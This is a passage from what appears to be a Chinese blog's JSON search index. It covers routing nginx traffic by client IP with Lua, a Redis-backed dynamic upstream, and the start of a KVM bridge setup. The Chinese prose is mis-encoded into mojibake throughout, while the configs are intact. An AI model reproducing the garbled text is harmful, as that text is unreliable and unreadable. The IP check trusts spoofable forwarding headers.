·æ€ä¹ˆåˆ†å‘å‘¢ï¼Ÿ\nç”¨luaå³å¯ï¼Œå¦‚æœæ˜¯å…¬å¸æ¥çš„æŸä¸ªå›ºå®šipï¼Œåˆ™åˆ†å‘åˆ°é¢„å‘å¸ƒï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±èµ°æ­£å¼ç¯å¢ƒã€‚è¿™æ ·æµ‹è¯•å°±ç®€å•å¤šäº†ï¼Œè¿ç»´ç»Ÿä¸€è®¾ç½®ä¸€ä¸ªæ— çº¿wifiï¼Œæ¥å…¥è¿™ä¸ªwifiå°±èµ°æŸä¸ªå›ºå®šipï¼Œåˆ°çš„å…¨æ˜¯é¢„å‘å¸ƒç¯å¢ƒï¼Œä¸ç”¨è¿™ä¸ªwifiå°±èµ°æ­£å¼ç¯å¢ƒï¼Œéå¸¸æ–¹ä¾¿æµ‹è¯•ã€‚\nç”¨luaè¿›è¡Œåˆ†å‘ï¼š\nlocation / { content_by_lua \u0026#39; myIP = ngx.req.get_headers()[\u0026#34;X-Real-IP\u0026#34;] if myIP == nil then myIP = ngx.req.get_headers()[\u0026#34;x_forwarded_for\u0026#34;] end if myIP == nil then myIP = ngx.var.remote_addr end if myIP == \u0026#34;å…¬å¸å‡ºå£IP\u0026#34; then ngx.exec(\u0026#34;@client\u0026#34;) else ngx.exec(\u0026#34;@client_test\u0026#34;) end \u0026#39;; } location @client{ proxy_next_upstream error timeout; proxy_redirect off; proxy_set_header Host $host; #proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-IP $http_x_forwarded_for; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 100m; client_body_buffer_size 256k; proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_buffer_size 8k; proxy_buffers 8 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_pass http://client; } location @client_test{ proxy_next_upstream error timeout; proxy_redirect off; proxy_set_header Host $host; #proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-IP $http_x_forwarded_for; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 100m; client_body_buffer_size 256k; proxy_connect_timeout 180; proxy_send_timeout 180; proxy_read_timeout 180; proxy_buffer_size 8k; proxy_buffers 8 64k; proxy_busy_buffers_size 128k; proxy_temp_file_write_size 128k; proxy_pass http://client_test; } ","permalink":"https://rendoumi.com/posts/20240123-lua_ip_forward/","summary":"\u003cp\u003eå…¬å¸çš„çº¿ä¸Šç¯å¢ƒåˆ†ä¸ºé¢„å‘å¸ƒå’Œæ­£å¼ä¸¤ä¸ªéƒ¨åˆ†ã€‚\u003c/p\u003e\n\u003cp\u003eå…¶å®ä¸¤ä¸ªéƒ¨åˆ†æ˜¯å…¬ç”¨ä¸€ä¸ªNginxå‰ç«¯çš„ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·æ€ä¹ˆåˆ†å‘å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eç”¨\u003ccode\u003elua\u003c/code\u003eå³å¯ï¼Œå¦‚æœæ˜¯å…¬å¸æ¥çš„æŸä¸ªå›ºå®šipï¼Œåˆ™åˆ†å‘åˆ°é¢„å‘å¸ƒï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±èµ°æ­£å¼ç¯å¢ƒã€‚è¿™æ ·æµ‹è¯•å°±ç®€å•å¤šäº†ï¼Œè¿ç»´ç»Ÿä¸€è®¾ç½®ä¸€ä¸ªæ— çº¿wifiï¼Œæ¥å…¥è¿™ä¸ªwifiå°±èµ°æŸä¸ªå›ºå®šipï¼Œåˆ°çš„å…¨æ˜¯é¢„å‘å¸ƒç¯å¢ƒï¼Œä¸ç”¨è¿™ä¸ªwifiå°±èµ°æ­£å¼ç¯å¢ƒï¼Œéå¸¸æ–¹ä¾¿æµ‹è¯•ã€‚\u003c/p\u003e\n\u003cp\u003eç”¨luaè¿›è¡Œåˆ†å‘ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation / \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    content_by_lua \u003cspan class=\"s1\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            myIP = ngx.req.get_headers()[\u0026#34;X-Real-IP\u0026#34;]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                myIP = ngx.req.get_headers()[\u0026#34;x_forwarded_for\u0026#34;]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                myIP = ngx.var.remote_addr\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            if myIP == \u0026#34;å…¬å¸å‡ºå£IP\u0026#34; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                ngx.exec(\u0026#34;@client\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e                ngx.exec(\u0026#34;@client_test\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e            end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation @client\u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_next_upstream     error timeout\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect          off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#proxy_set_header        X-Real-IP $remote_addr;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Real-IP \u003cspan class=\"nv\"\u003e$http_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_max_body_size    100m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_body_buffer_size 256k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout   180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffer_size       8k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffers           \u003cspan class=\"m\"\u003e8\u003c/span\u003e 64k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_busy_buffers_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_temp_file_write_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass http://client\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elocation @client_test\u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_next_upstream     error timeout\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect          off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e#proxy_set_header        X-Real-IP $remote_addr;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Real-IP \u003cspan class=\"nv\"\u003e$http_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header        X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_max_body_size    100m\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    client_body_buffer_size 256k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout   180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout      180\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffer_size       8k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffers           \u003cspan class=\"m\"\u003e8\u003c/span\u003e 64k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_busy_buffers_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_temp_file_write_size 128k\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass http://client_test\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Nginxä¸‹luaæ ¹æ®å®¢æˆ·ç«¯ipè¿›è¡Œåˆ†å‘"},{"content":"æŠ€æœ¯è¦æ±‚å¾ˆç®€æ˜ï¼š\nnginxåˆ†å‘è¯·æ±‚çš„æ—¶å€™ï¼Œupstreamæ˜¯ç”±luaä»redisä¸­è¯»å–é…ç½®åŠ¨æ€ç”Ÿæˆçš„ï¼Œè¿™æ ·ä¾¿äºç”¨ç¨‹åºåŠ¨æ€ä¿®æ”¹ã€‚\nè£…å¥½nginx+luaï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚ æŠŠlua redisçš„æ¨¡å—é…åˆ°è·¯å¾„ä¸­\nwget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua nginxé…ç½®å¦‚ä¸‹ï¼š\nserver { listen 80; server_name _; server_name_in_redirect off; port_in_redirect off; root /root/html; location / { set $upstream \u0026#34;\u0026#34;; rewrite_by_lua \u0026#39; -- load global route cache into current request scope -- by default vars are not shared between requests local routes = _G.routes -- setup routes cache if empty if routes == nil then routes = {} ngx.log(ngx.ALERT, \u0026#34;Route cache is empty.\u0026#34;) end -- try cached route first local route = routes[ngx.var.http_host] if route == nil then local redis = require \u0026#34;redis\u0026#34; local client = redis.connect(\u0026#34;localhost\u0026#34;, 6379) route = client:get(ngx.var.http_host) end -- fallback to redis for lookups if route ~= nil then ngx.var.upstream = route routes[ngx.var.http_host] = route _G.routes = routes else ngx.exit(ngx.HTTP_NOT_FOUND) end \u0026#39;; proxy_buffering off; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect off; proxy_connect_timeout 10; proxy_send_timeout 30; proxy_read_timeout 30; proxy_pass http://$upstream; } } é€è¿›redisä¸€äº›æ•°æ®\nredis-cli =\u0026gt; SET localhost 127.0.0.1:49153 æµ‹è¯•ä¸€ä¸‹ï¼š\ncurl -i -X HEAD \u0026#34;http://127.0.0.1/\u0026#34; # -\u0026gt; 404ï¼Œæ²¡è¿™ä¸ªåŸŸå curl -i -X HEAD \u0026#34;http://localhost/\u0026#34; # -\u0026gt; æ­£å¸¸ ","permalink":"https://rendoumi.com/posts/20240123-lua_redis_nginx_upstream/","summary":"\u003cp\u003eæŠ€æœ¯è¦æ±‚å¾ˆç®€æ˜ï¼š\u003c/p\u003e\n\u003cp\u003enginxåˆ†å‘è¯·æ±‚çš„æ—¶å€™ï¼Œupstreamæ˜¯ç”±luaä»redisä¸­è¯»å–é…ç½®åŠ¨æ€ç”Ÿæˆçš„ï¼Œè¿™æ ·ä¾¿äºç”¨ç¨‹åºåŠ¨æ€ä¿®æ”¹ã€‚\u003c/p\u003e\n\u003cp\u003eè£…å¥½nginx+luaï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚ æŠŠlua redisçš„æ¨¡å—é…åˆ°è·¯å¾„ä¸­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003enginxé…ç½®å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  listen 80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server_name _\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  server_name_in_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  port_in_redirect off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  root /root/html\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  location / \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eset\u003c/span\u003e \u003cspan class=\"nv\"\u003e$upstream\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    rewrite_by_lua \u003cspan class=\"s1\"\u003e\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- load global route cache into current request scope\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- by default vars are not shared between requests\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      local routes = _G.routes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- setup routes cache if empty\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if routes == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        routes = {}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.log(ngx.ALERT, \u0026#34;Route cache is empty.\u0026#34;)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- try cached route first\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      local route = routes[ngx.var.http_host]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if route == nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        local redis  = require \u0026#34;redis\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        local client = redis.connect(\u0026#34;localhost\u0026#34;, 6379)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        route        = client:get(ngx.var.http_host)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      -- fallback to redis for lookups\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      if route ~= nil then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.var.upstream = route\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        routes[ngx.var.http_host] = route\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        _G.routes = routes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      else\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e        ngx.exit(ngx.HTTP_NOT_FOUND)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e      end\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e    \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_buffering             off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header            Host \u003cspan class=\"nv\"\u003e$host\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_set_header            X-Forwarded-For \u003cspan class=\"nv\"\u003e$proxy_add_x_forwarded_for\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_redirect              off\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_connect_timeout       10\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_send_timeout          30\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_read_timeout          30\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    proxy_pass                  http://\u003cspan class=\"nv\"\u003e$upstream\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé€è¿›redisä¸€äº›æ•°æ®\u003c/p\u003e","title":"luaä¸redisç»“åˆåº”ç”¨äºnginxçš„åŠ¨æ€upstream"},{"content":"æ¯”è¾ƒå¤æ€ªçš„éœ€æ±‚ï¼Œå…¬å¸æ‹‰äº†æ ¹ä¸“çº¿åˆ°æœºæˆ¿ã€‚\nè€Œä½¿ç”¨ä¸“çº¿çš„æœºå™¨æ˜¯ä¸€å°kvmè™šæœºï¼Œå®ä½“æœºæœ‰è‡ªå·±çš„è·¯ç”±ï¼Œå®ä½“æœºçš„å‰ä¸¤ä¸ªç½‘å¡åšäº†åŒç½‘å¡bondingã€‚\né‚£è™šæœºå°±åªèƒ½ä½¿ç”¨å®æœºçš„ç¬¬ä¸‰å—ç½‘å¡è¿å‡ºå»äº†ï¼Œè€Œä¸”å¿…é¡»åˆ¶å®šhostçš„è·¯ç”±ï¼Œè¿™é‡Œç»™çš„å­ç½‘æ©ç æ˜¯255.255.255.252ï¼Œåªæœ‰2ä¸ªipå¯ä»¥ç”¨ï¼Œæ‰€ä»¥åªèƒ½è™šæœºæœ‰ipï¼Œå®æœºæ ¹æœ¬ä¸èƒ½é…ipåœ°å€ï¼ï¼ï¼\né¦–å…ˆæŠŠå®æœºdell r720çš„ç¬¬ä¸‰å—ç½‘å¡em3æ”¹ä¸€ä¸‹ï¼Œè¿æ¥åˆ°ç½‘æ¡¥br1\ncat /etc/sysconfig/network-scripts/ifcfg-em3 DEVICE=em3 HWADDR=XX:XX:XX:XX:XX:XX 